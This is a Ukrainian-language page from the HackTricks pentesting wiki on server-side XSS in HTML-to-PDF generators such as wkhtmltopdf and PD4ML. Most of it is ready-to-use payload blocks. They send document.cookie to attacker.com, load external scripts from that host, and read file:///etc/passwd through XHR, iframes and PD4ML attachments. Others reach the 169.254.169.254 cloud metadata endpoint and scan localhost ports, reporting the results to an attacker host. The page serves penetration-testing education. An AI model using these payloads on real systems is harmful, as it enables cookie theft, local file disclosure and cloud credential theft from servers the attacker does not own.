# –°–µ—Ä–≤–µ—Ä–Ω–∏–π XSS (–î–∏–Ω–∞–º—ñ—á–Ω–∏–π PDF)

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (–ï–∫—Å–ø–µ—Ä—Ç –∑ –ß–µ—Ä–≤–æ–Ω–æ–≥–æ –¢—ñ–º—É AWS –≤—ñ–¥ HackTricks)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ GitHub.

</details>

## –°–µ—Ä–≤–µ—Ä–Ω–∏–π XSS (–î–∏–Ω–∞–º—ñ—á–Ω–∏–π PDF)

–Ø–∫—â–æ –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω–∫–∞ —Å—Ç–≤–æ—Ä—é—î PDF, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –≤–≤–µ–¥–µ–Ω–Ω—è, –∫–æ—Ç—Ä–µ –∫–æ–Ω—Ç—Ä–æ–ª—é—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á, –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ **–æ–±–º–∞–Ω—É—Ç–∏ –±–æ—Ç–∞**, —è–∫–∏–π —Å—Ç–≤–æ—Ä—é—î PDF, —â–æ–± **–≤–∏–∫–æ–Ω–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π JS –∫–æ–¥**.\
–û—Ç–∂–µ, —è–∫—â–æ **–±–æ—Ç –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è PDF –∑–Ω–∞—Ö–æ–¥–∏—Ç—å** —è–∫—ñ—Å—å **HTML** **—Ç–µ–≥–∏**, –≤—ñ–Ω –±—É–¥–µ —ó—Ö **—ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç—É–≤–∞—Ç–∏**, —ñ –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏** —Ü–∏–º –ø–æ–≤–µ–¥—ñ–Ω–∫–æ—é, —â–æ–± –≤–∏–∫–ª–∏–∫–∞—Ç–∏ **–°–µ—Ä–≤–µ—Ä–Ω–∏–π XSS**.

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —Ç–µ–≥–∏ `<script></script>` –Ω–µ –∑–∞–≤–∂–¥–∏ –ø—Ä–∞—Ü—é—é—Ç—å, —Ç–æ–º—É –≤–∞–º –∑–Ω–∞–¥–æ–±–∏—Ç—å—Å—è —ñ–Ω—à–∏–π –º–µ—Ç–æ–¥ –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è JS (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è `<img` ).\
–¢–∞–∫–æ–∂ –∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –ø—ñ–¥ —á–∞—Å –∑–≤–∏—á–∞–π–Ω–æ—ó –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –≤–∏ –∑–º–æ–∂–µ—Ç–µ **–ø–æ–±–∞—á–∏—Ç–∏/–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Å—Ç–≤–æ—Ä–µ–Ω–∏–π PDF**, —Ç–æ–º—É –≤–∏ –∑–º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤—Å–µ, —â–æ –≤–∏ **–∑–∞–ø–∏—Å—É—î—Ç–µ —á–µ—Ä–µ–∑ JS** (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ `document.write()`). –ê–ª–µ, —è–∫—â–æ –≤–∏ **–Ω–µ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏** —Å—Ç–≤–æ—Ä–µ–Ω–∏–π PDF, –≤–∞–º, –π–º–æ–≤—ñ—Ä–Ω–æ, –∑–Ω–∞–¥–æ–±–∏—Ç—å—Å—è **–≤–∏—Ç—è–≥–Ω—É—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é, —Ä–æ–±–ª—è—á–∏ –∑–∞–ø–∏—Ç–∏ –Ω–∞ –≤–∞—à –±—Ä–∞—É–∑–µ—Ä** (–°–ª—ñ–ø–∏–π).

### –ü–æ–ø—É–ª—è—Ä–Ω–µ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è PDF

- **wkhtmltopdf** –≤—ñ–¥–æ–º–∏–π —Å–≤–æ—î—é –∑–¥–∞—Ç–Ω—ñ—Å—Ç—é –ø–µ—Ä–µ—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ HTML —Ç–∞ CSS –≤ –¥–æ–∫—É–º–µ–Ω—Ç–∏ PDF, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ä—É—à—ñ–π —Ä–µ–Ω–¥–µ—Ä–∏–Ω–≥—É WebKit. –¶–µ–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–æ—Å—Ç—É–ø–Ω–∏–π —è–∫ —É—Ç–∏–ª—ñ—Ç–∞ –∫–æ–º–∞–Ω–¥–Ω–æ–≥–æ —Ä—è–¥–∫–∞ –∑ –≤—ñ–¥–∫—Ä–∏—Ç–∏–º –≤–∏—Ö—ñ–¥–Ω–∏–º –∫–æ–¥–æ–º, —â–æ —Ä–æ–±–∏—Ç—å –π–æ–≥–æ –¥–æ—Å—Ç—É–ø–Ω–∏–º –¥–ª—è —à–∏—Ä–æ–∫–æ–≥–æ —Å–ø–µ–∫—Ç—Ä—É –∑–∞—Å—Ç–æ—Å—É–≤–∞–Ω—å.
- **TCPDF** –ø—Ä–æ–ø–æ–Ω—É—î –Ω–∞–¥—ñ–π–Ω–µ —Ä—ñ—à–µ–Ω–Ω—è –≤ –µ–∫–æ—Å–∏—Å—Ç–µ–º—ñ PHP –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è PDF. –í—ñ–Ω –∑–¥–∞—Ç–Ω–∏–π –æ–±—Ä–æ–±–ª—è—Ç–∏ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è, –≥—Ä–∞—Ñ—ñ–∫—É —Ç–∞ —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è, –¥–µ–º–æ–Ω—Å—Ç—Ä—É—é—á–∏ —Å–≤–æ—é —É–Ω—ñ–≤–µ—Ä—Å–∞–ª—å–Ω—ñ—Å—Ç—å –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è —Å–∫–ª–∞–¥–Ω–∏—Ö –¥–æ–∫—É–º–µ–Ω—Ç—ñ–≤.
- –î–ª—è —Ç–∏—Ö, —Ö—Ç–æ –ø—Ä–∞—Ü—é—î –≤ —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ Node.js, **PDFKit** –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è—î —Å–æ–±–æ—é –ø—Ä–∏–π–Ω—è—Ç–Ω–∏–π –≤–∞—Ä—ñ–∞–Ω—Ç. –í—ñ–Ω –¥–æ–∑–≤–æ–ª—è—î —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ –¥–æ–∫—É–º–µ–Ω—Ç–∏ PDF –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –∑ HTML —Ç–∞ CSS, –∑–∞–±–µ–∑–ø–µ—á—É—é—á–∏ –º—ñ—Å—Ç–æ –º—ñ–∂ –≤–µ–±-–∫–æ–Ω—Ç–µ–Ω—Ç–æ–º —Ç–∞ –¥—Ä—É–∫–æ–≤–∞–Ω–∏–º–∏ —Ñ–æ—Ä–º–∞—Ç–∞–º–∏.
- –†–æ–∑—Ä–æ–±–Ω–∏–∫–∏ Java –º–æ–∂—É—Ç—å –≤—ñ–¥–¥–∞—Ç–∏ –ø–µ—Ä–µ–≤–∞–≥—É **iText**, –±—ñ–±–ª—ñ–æ—Ç–µ—Ü—ñ, —è–∫–∞ –Ω–µ —Ç—ñ–ª—å–∫–∏ —Å–ø—Ä–∏—è—î —Å—Ç–≤–æ—Ä–µ–Ω–Ω—é PDF, –∞–ª–µ –π –ø—ñ–¥—Ç—Ä–∏–º—É—î –ø–µ—Ä–µ–¥–æ–≤—ñ —Ñ—É–Ω–∫—Ü—ñ—ó, —Ç–∞–∫—ñ —è–∫ —Ü–∏—Ñ—Ä–æ–≤—ñ –ø—ñ–¥–ø–∏—Å–∏ —Ç–∞ –∑–∞–ø–æ–≤–Ω–µ–Ω–Ω—è —Ñ–æ—Ä–º. –á—ó —à–∏—Ä–æ–∫–∏–π —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª —Ä–æ–±–∏—Ç—å —ó—ó –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ—é –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –±–µ–∑–ø–µ—á–Ω–∏—Ö —Ç–∞ —ñ–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω–∏—Ö –¥–æ–∫—É–º–µ–Ω—Ç—ñ–≤.
- **FPDF** —î —â–µ –æ–¥–Ω—ñ—î—é –±—ñ–±–ª—ñ–æ—Ç–µ–∫–æ—é PHP, –≤—ñ–¥–æ–º–æ—é —Å–≤–æ—î—é –ø—Ä–æ—Å—Ç–æ—Ç–æ—é —Ç–∞ –ª–µ–≥–∫—ñ—Å—Ç—é –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è. –í–æ–Ω–∞ –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∞ –¥–ª—è —Ä–æ–∑—Ä–æ–±–Ω–∏–∫—ñ–≤, —è–∫—ñ —à—É–∫–∞—é—Ç—å –ø—Ä–æ—Å—Ç–∏–π –ø—ñ–¥—Ö—ñ–¥ –¥–æ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è PDF –±–µ–∑ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ—Å—Ç—ñ –≤–µ–ª–∏–∫–æ–≥–æ –Ω–∞–±–æ—Ä—É —Ñ—É–Ω–∫—Ü—ñ–π.


## –ü–µ–π–ª–æ–∞–¥–∏

### –í—ñ–¥–∫—Ä–∏—Ç—Ç—è
```markup
<!-- Basic discovery, Write somthing-->
<img src="x" onerror="document.write('test')" />
<script>document.write(JSON.stringify(window.location))</script>
<script>document.write('<iframe src="'+window.location.href+'"></iframe>')</script>

<!--Basic blind discovery, load a resource-->
<img src="http://attacker.com"/>
<img src=x onerror="location.href='http://attacker.com/?c='+ document.cookie">
<script>new Image().src="http://attacker.com/?c="+encodeURI(document.cookie);</script>
<link rel=attachment href="http://attacker.com">
```
### SVG

–ë—É–¥—å-—è–∫–∏–π –∑ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ—Ö –∞–±–æ –Ω–∞—Å—Ç—É–ø–Ω–∏—Ö –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ü—å–æ–≥–æ SVG –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ. –û–¥–∏–Ω iframe, —è–∫–∏–π –æ—Ç—Ä–∏–º—É—î –¥–æ—Å—Ç—É–ø –¥–æ –ø—ñ–¥–¥–æ–º–µ–Ω—É Burpcollab, —Ç–∞ —ñ–Ω—à–∏–π, —è–∫–∏–π –æ—Ç—Ä–∏–º—É—î –¥–æ—Å—Ç—É–ø –¥–æ –∫—ñ–Ω—Ü–µ–≤–æ—ó —Ç–æ—á–∫–∏ –º–µ—Ç–∞–¥–∞–Ω–∏—Ö, –Ω–∞–≤–µ–¥–µ–Ω—ñ —è–∫ –ø—Ä–∏–∫–ª–∞–¥–∏.
```markup
<svg xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="root" width="800" height="500">
<g>
<foreignObject width="800" height="500">
<body xmlns="http://www.w3.org/1999/xhtml">
<iframe src="http://redacted.burpcollaborator.net" width="800" height="500"></iframe>
<iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"></iframe>
</body>
</foreignObject>
</g>
</svg>


<svg width="100%" height="100%" viewBox="0 0 100 100"
xmlns="http://www.w3.org/2000/svg">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>
<script type="text/javascript">
// <![CDATA[
alert(1);
// ]]>
</script>
</svg>
```
–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –±–∞–≥–∞—Ç–æ **—ñ–Ω—à–∏—Ö SVG –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π** –Ω–∞ [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)

### –†–æ–∑–∫—Ä–∏—Ç—Ç—è —à–ª—è—Ö—É
```markup
<!-- If the bot is accessing a file:// path, you will discover the internal path
if not, you will at least have wich path the bot is accessing -->
<img src="x" onerror="document.write(window.location)" />
<script> document.write(window.location) </script>
```
### –ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –∑–æ–≤–Ω—ñ—à–Ω—ñ–π —Å–∫—Ä–∏–ø—Ç

–ù–∞–π–∫—Ä–∞—â–∏–π —Å–ø–æ—Å—ñ–± –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ü—ñ—î—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ - –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—é, —â–æ–± –∑–º—É—Å–∏—Ç–∏ –±–æ—Ç–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Å–∫—Ä–∏–ø—Ç, —è–∫–∏–º –≤–∏ –∫–µ—Ä—É—î—Ç–µ –ª–æ–∫–∞–ª—å–Ω–æ. –ü–æ—Ç—ñ–º –≤–∏ –∑–º–æ–∂–µ—Ç–µ –ª–æ–∫–∞–ª—å–Ω–æ –∑–º—ñ–Ω–∏—Ç–∏ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —ñ –∑–º—É—Å–∏—Ç–∏ –±–æ—Ç–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –π–æ–≥–æ –∑ —Ç–∏–º —Å–∞–º–∏–º –∫–æ–¥–æ–º –∫–æ–∂–Ω–æ–≥–æ —Ä–∞–∑—É.
```markup
<script src="http://attacker.com/myscripts.js"></script>
<img src="xasdasdasd" onerror="document.write('<script src="https://attacker.com/test.js"></script>')"/>
```
### –ß–∏—Ç–∞–Ω–Ω—è –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ —Ñ–∞–π–ª—É / SSRF

{% hint style="warning" %}
–ó–º—ñ–Ω—ñ—Ç—å `file:///etc/passwd` –Ω–∞ `http://169.254.169.254/latest/user-data`, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, —â–æ–± **—Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –∑–æ–≤–Ω—ñ—à–Ω—å–æ—ó –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω–∫–∏ (SSRF)**.

–Ø–∫—â–æ SSRF –¥–æ–∑–≤–æ–ª–µ–Ω–æ, –∞–ª–µ –≤–∏ **–Ω–µ –º–æ–∂–µ—Ç–µ –¥–æ—Å—è–≥—Ç–∏** —Ü—ñ–∫–∞–≤–æ–≥–æ –¥–æ–º–µ–Ω—É –∞–±–æ IP-–∞–¥—Ä–µ—Å—É, [–ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ü—é —Å—Ç–æ—Ä—ñ–Ω–∫—É –Ω–∞ –º–æ–∂–ª–∏–≤—ñ –æ–±—Ö—ñ–¥–Ω—ñ —à–ª—è—Ö–∏](../ssrf-server-side-request-forgery/url-format-bypass.md).
{% endhint %}
```markup
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write(btoa(this.responseText))};
x.open("GET","file:///etc/passwd");x.send();
</script>
```

```markup
<script>
xhzeem = new XMLHttpRequest();
xhzeem.onload = function(){document.write(this.responseText);}
xhzeem.onerror = function(){document.write('failed!')}
xhzeem.open("GET","file:///etc/passwd");
xhzeem.send();
</script>
```

```markup
<iframe src=file:///etc/passwd></iframe>
<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
<link rel=attachment href="file:///root/secret.txt">
<object data="file:///etc/passwd">
<portal src="file:///etc/passwd" id=portal>
<embed src="file:///etc/passwd>" width="400" height="400">
<style><iframe src="file:///etc/passwd">
<img src='x' onerror='document.write('<iframe src=file:///etc/passwd></iframe>')'/>&text=&width=500&height=500
<meta http-equiv="refresh" content="0;url=file:///etc/passwd" />
```

```markup
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
```
### –ó–∞—Ç—Ä–∏–º–∫–∞ –±–æ—Ç–∞
```markup
<!--Make the bot send a ping every 500ms to check how long does the bot wait-->
<script>
let time = 500;
setInterval(()=>{
let img = document.createElement("img");
img.src = `https://attacker.com/ping?time=${time}ms`;
time += 500;
}, 500);
</script>
<img src="https://attacker.com/delay">
```
### –°–∫–∞–Ω—É–≤–∞–Ω–Ω—è –ø–æ—Ä—Ç—ñ–≤
```markup
<!--Scan local port and receive a ping indicating which ones are found-->
<script>
const checkPort = (port) => {
fetch(`http://localhost:${port}`, { mode: "no-cors" }).then(() => {
let img = document.createElement("img");
img.src = `http://attacker.com/ping?port=${port}`;
});
}

for(let i=0; i<1000; i++) {
checkPort(i);
}
</script>
<img src="https://attacker.com/startingScan">
```
### [SSRF](../ssrf-server-side-request-forgery/)

–¶—è —É—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –º–æ–∂–µ –±—É—Ç–∏ –¥—É–∂–µ –ª–µ–≥–∫–æ –ø–µ—Ä–µ—Ç–≤–æ—Ä–µ–Ω–∞ –Ω–∞ SSRF (–æ—Å–∫—ñ–ª—å–∫–∏ –≤–∏ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏ —Å–∫—Ä–∏–ø—Ç –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ –∑–æ–≤–Ω—ñ—à–Ω—ñ —Ä–µ—Å—É—Ä—Å–∏). –¢–æ–º—É –ø—Ä–æ—Å—Ç–æ —Å–ø—Ä–æ–±—É–π—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ —ó—ó (–ø—Ä–æ—á–∏—Ç–∞—Ç–∏ –¥–µ—è–∫—É –º–µ—Ç–∞–¥–∞–Ω—ñ?).

### –í–∫–ª–∞–¥–µ–Ω–Ω—è: PD4ML

–Ü—Å–Ω—É—é—Ç—å –¥–µ—è–∫—ñ –¥–≤–∏–≥—É–Ω–∏ HTML 2 PDF, —è–∫—ñ –¥–æ–∑–≤–æ–ª—è—é—Ç—å **–≤–∫–∞–∑—É–≤–∞—Ç–∏ –≤–∫–ª–∞–¥–µ–Ω–Ω—è –¥–ª—è PDF**, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥ **PD4ML**. –í–∏ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü—ñ—î—é —Ñ—É–Ω–∫—Ü—ñ—î—é, —â–æ–± **–¥–æ–ª—É—á–∏—Ç–∏ –±—É–¥—å-—è–∫–∏–π –ª–æ–∫–∞–ª—å–Ω–∏–π —Ñ–∞–π–ª** –¥–æ PDF.\
–î–ª—è –≤—ñ–¥–∫—Ä–∏—Ç—Ç—è –≤–∫–ª–∞–¥–µ–Ω–Ω—è —è –≤—ñ–¥–∫—Ä–∏–≤ —Ñ–∞–π–ª —É **Firefox —ñ –ø–æ–¥–≤—ñ–π–Ω–æ –∫–ª–∞—Ü–Ω—É–≤ –Ω–∞ —Å–∏–º–≤–æ–ª—ñ "–ó–∞–∫–æ–ª–∫–∞"**, —â–æ–± **–∑–±–µ—Ä–µ–≥—Ç–∏ –≤–∫–ª–∞–¥–µ–Ω–Ω—è** —è–∫ –Ω–æ–≤–∏–π —Ñ–∞–π–ª.\
–ó–∞—Ö–æ–ø–ª–µ–Ω–Ω—è **–≤—ñ–¥–ø–æ–≤—ñ–¥—ñ —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é Burp —Ç–∞–∫–æ–∂ **–ø–æ–≤–∏–Ω–Ω–æ –ø–æ–∫–∞–∑–∞—Ç–∏ –≤–∫–ª–∞–¥–µ–Ω–Ω—è —É —á–∏—Å—Ç–æ–º—É —Ç–µ–∫—Å—Ç—ñ** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ PDF.

{% code overflow="wrap" %}
```html
<!-- From https://0xdf.gitlab.io/2021/04/24/htb-bucket.html -->
<html><pd4ml:attachment src="/etc/passwd" description="attachment sample" icon="Paperclip"/></html>
```
{% endcode %}

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://lbherrera.github.io/lab/h1415-ctf-writeup.html](https://lbherrera.github.io/lab/h1415-ctf-writeup.html)
* [https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/](https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/)
* [https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)
* [https://infosecwriteups.com/breaking-down-ssrf-on-pdf-generation-a-pentesting-guide-66f8a309bf3c](https://infosecwriteups.com/breaking-down-ssrf-on-pdf-generation-a-pentesting-guide-66f8a309bf3c)

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –≤ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>
